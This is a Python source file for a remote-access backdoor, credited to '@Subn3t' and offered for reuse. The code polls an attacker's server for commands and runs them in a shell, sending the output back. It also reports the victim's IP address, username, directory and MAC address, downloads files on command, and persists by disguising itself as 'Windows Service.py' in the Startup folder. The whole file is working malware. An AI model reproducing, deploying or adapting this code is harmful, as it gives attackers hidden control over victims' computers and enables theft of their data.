'''

- Backdoor coded by @Subn3t
- Version: 1.0.4
- GitHub: https://github.com/gdsubn3t/Backdoor/
- You can use this code, but please give credits.
- Have fun and stay legal!

'''


import requests, sys, subprocess, urllib.request, platform, os, time, uuid



def save(server):
	directory = os.getcwd() # get the current directory
	name = sys.argv[0] # get the malware's name
	malware = directory + '\\' + name # malware location
	userstartup = 'C:\\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup'
	malware = directory + '\\' + name
	if platform.system() == 'Windows':
		WindowsService = 'Windows Service.py'
		move = 'move %s "%s\%s"' %(malware, userstartup, WindowsService)
		command = subprocess.run(move, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
		moveresult = "\033[97mSuccessfully moved \033[94m%s \033[97mto \033[94m%s\\%s\033[97m" %(malware, userstartup, WindowsService)
		requests.post(server, data={'key':'', 'text':moveresult})

def get_mac(server, xserver):
    mac =  str(':'.join(['{:02x}'.format((uuid.getnode() >> i) & 0xff) for i in range(0,8*6,8)][::-1])).upper()
    requests.post(server, data={'key':'','text':'Victim\'s mac address: \033[94m' + mac + '\n'})

def download(server, url, filename):
    try:
        urllib.request.urlretrieve(url, filename)
        data = 'Sucsefully downloaded %s' %(filename)
        requests.post(server, data={'key':'','text':data})
    except:
        requests.post(server, data={'key':'','text':'Download failed'})

def welcome(server, xserver): 
	# welcome function to get the basics information
	# about the victim

	ip = requests.get('').text
	name = subprocess.run('whoami', shell=True, stdout = subprocess.PIPE, stderr = subprocess.PIPE)
	name = name.stdout
	directory = os.getcwd()
	# now we got the ip addres, the username and the current path
	data = '|#| '+str(ip) + '|#|' + (bytes(name).decode("utf-8")).strip()  + '|#|' + str(directory)
	requests.post(server, data={'key':'', 'text':data}) # send the data 

def main(server, xserver):
	welcome(server, xserver)

	while (requests.get(xserver, timeout=1).text)[:3] == '|#|': # this loop waits for a command from the attacker
		pass

	command = ''
	oldcommand = ''

	while True: # the main loop begins
		command = requests.get(xserver).text

		if command[:3] == '$%&':
			command = command[3:]

			if not command == oldcommand:
				backdoorDir = os.getcwd()
				if command == ':exit':
					sys.exit()
				elif command[:9] == ':download':
					command, url, filename = command.split(' ')
					download(server, url, filename)
				elif command == ':mac':
					get_mac(server, xserver)
				elif command[:2] == 'cd':
					path = command[3:]
					os.chdir(path)
					backdoorDir = os.getcwd()
					requests.post(server, data={'key':'','text':backdoorDir})
				elif command == ':save':
					save(server)
				elif command == ':delete':
					if platform.system == 'Linux':
						delete = 'rm \nrm '
						os.system('echo "'+delete+'" >> deleter.sh')
						os.system('bash deleter.sh')
					elif platform.system == 'Windows':
						delete = 'del \ndel'
						os.system('echo '+delete+' >> deleter.bat')
						os.system('start deleter.bat')
				else:
					command = subprocess.run(command, shell=True, stdout = subprocess.PIPE, stderr  = subprocess.PIPE)
					response = command.stdout + command.stderr
					requests.post(server, data={'key':'','text':response})
					oldcommand = command





if __name__ == '__main__':
	xserver = ''
	server = ''
	main(server, xserver)
